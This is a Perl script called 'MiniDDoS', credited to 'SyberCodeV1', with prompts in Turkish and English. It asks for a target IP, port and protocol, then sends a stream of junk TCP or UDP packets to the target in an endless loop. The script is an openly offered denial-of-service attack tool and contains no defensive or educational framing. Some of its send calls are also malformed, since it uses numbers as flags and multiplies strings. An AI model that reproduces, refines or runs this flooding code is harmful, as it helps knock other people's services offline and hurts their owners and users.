#!/usr/bin/perl
#==============BİLGİ==============#
# SCRIPT: MiniDDoS
#    Project Name: MiniDDoS Project
#CodedBy: SyberCodeV1

#=== Use Modules ===#
use IO::Socket;
use Scalar::Util qw(looks_like_number);

#=== Clear Screen ===#
system("cls || clear");
#Script Banner================================================================
print q{ 
         __  __ _       _ ____  ____       ____
        |  \/  (_)_ __ (_)  _ \|  _ \  ___/ ___|
        | |\/| | | '_ \| | | | | | | |/ _ \___ \
        | |  | | | | | | | |_| | |_| | (_) |__) |
        |_|  |_|_|_| |_|_|____/|____/ \___/____/
           Coder: SyberCodeV1 & sybercodev1.com
};

my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com', 
	'PeerPort'=>80, 
	'Timeout'=>2, 
	'proto'=>'tcp');
if(!(defined $check && $check)){
	print("[-] İnternet İstatiği (bağlanılamadı)");
	print("\n[!]Lütfen İnternet Adresini kontrol edin !!!");
	exit(1);
}
$check->close();
# INPUT TARGET INFO ==============================================
print "\n===============================";
print "\n[~] İp adress: "; # Set Target IP
$host = <STDIN>;
chomp ($host);
while ($host eq ""){
 print "   [!] Re-enter IP address incorrectly: ";
 $host = <STDIN>;
 chomp ($host);
}
print "TRAGET ==> $host";
print "\n===============================";
print "\n[~] Enter the port address: "; # Set Port
$port = <STDIN>;
chomp ($port);
while ($port eq "" || !looks_like_number($port) || !grep{$port eq $_}(0..65535)){ 
 print "   [!] Re-enter the port address: ";       
 $port = <STDIN>;
 chomp ($port); 
} 
print "PORT ==> $port";
print "\n===============================";
print "\n[~] Protocol? (TCP - UDP) :"; # Set Protockol;
$proto = <STDIN>;
chomp ($proto);
while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
 print "   [!] you wrote wrong please try again(TCP - UDP) ?: ";
 $proto = <STDIN>;
 chomp ($proto);
}
print "Protocol ==> $proto";
print "\n===============================\n";
sleep(1);

$sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
system("clear || cls");
print "\n[*] Attack started! [$host:$port] proto => [$proto].......\n\n";
sleep(1);
while (1) {
  if(grep{$proto eq $_} 'TCP','tcp'){
       $sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Connection Failed [$host] port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
        for($i=0; $i<=500; $i++){
            $size = rand() * 8921873 * 99919988;
            print ("Attacking: (=>$host:$port~$proto<=) Packet sent: $size\n");
            send($sock, $size*2, $size*2); 
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
        }

  }else{
            $size = rand() * 8921873 * 99919988;
            print ("Attacking: (=>$host:$port~$proto<=) Packet sent: $size\n");
            send($sock, $size*2, $size*2); 
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
 }
}
$sock->close()
##############################################################################
#####################                                #########################
#####################   Thanks for using my tool     #########################
#####################                                #########################
##############################################################################

